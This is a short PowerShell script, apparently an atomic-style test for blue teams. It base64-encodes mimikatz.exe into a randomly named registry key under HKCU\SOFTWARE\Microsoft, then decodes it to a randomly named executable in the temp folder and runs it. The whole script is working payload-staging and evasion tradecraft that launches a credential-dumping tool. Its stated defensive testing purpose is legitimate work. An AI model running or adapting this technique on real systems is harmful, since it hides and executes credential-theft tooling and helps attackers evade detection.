###
# Atomics on a Friday
# Educational Purposes Only
# Blue Team only.
# This ps1 will create a registry path and key.
# Take a binary, base64 encode it and place it as the key in the registry.
# It will then decode and write the binary to disk and run it.
###

# Generate a random string
$randomString = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })

# Define registry path and key
$registryPath = "HKCU:\SOFTWARE\Microsoft\$randomString"
$registryKey = $env:USERNAME + '0'

# Create the registry key if it doesn't exist
if (!(Test-Path $registryPath)) {
    New-Item -Path $registryPath -Force | Out-Null
}

# Read the binary data from a file
$filePath = "c:\temp\mimikatz.exe"
$binaryData = Get-Content -Path $filePath -Encoding Byte

# Convert the binary data to base64
$base64Data = [Convert]::ToBase64String($binaryData)

# Write the base64-encoded data to the registry
Set-ItemProperty -Path $registryPath -Name $registryKey -Value $base64Data -Type String

# Read the base64-encoded data from the registry
$base64Data = (Get-ItemProperty -Path $registryPath -Name $registryKey).$registryKey

# Decode the base64-encoded data to binary
$binaryData = [Convert]::FromBase64String($base64Data)

# Save the binary data to a temporary file with a random name and .exe extension
$tempFileName = [System.IO.Path]::GetRandomFileName() + ".exe"
$tempFilePath = Join-Path $env:TEMP $tempFileName
Set-Content -Path $tempFilePath -Value $binaryData -Encoding Byte

# Execute the temporary file
Start-Process -FilePath $tempFilePath 

# Optional: Remove the temporary file after execution (uncomment the following line if you want to remove the file)
# Remove-Item -Path $tempFilePath -Force
Write-Host "Registry Path: $registryPath"
Write-Host "Registry Key: $registryKey"